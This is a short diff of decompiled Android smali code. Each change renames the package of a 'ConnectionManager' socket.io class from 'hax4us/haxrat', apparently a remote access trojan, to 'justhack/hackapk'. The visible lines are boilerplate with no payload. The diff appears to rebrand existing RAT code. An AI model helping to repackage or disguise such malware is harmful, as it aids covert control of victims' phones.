@@ -1,4 +1,4 @@
-.class Lcom/hax4us/haxrat/ConnectionManager$100000000;
+.class Lcom/justhack/hackapk/ConnectionManager$100000000;
 .super Ljava/lang/Object;
 .source "ConnectionManager.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/ConnectionManager;
+    value = Lcom/justhack/hackapk/ConnectionManager;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -51,7 +51,7 @@
 
     move-object v1, p1
 
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->access$L1000000()Lio/socket/client/Socket;
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->access$L1000000()Lio/socket/client/Socket;
 
     move-result-object v3
 
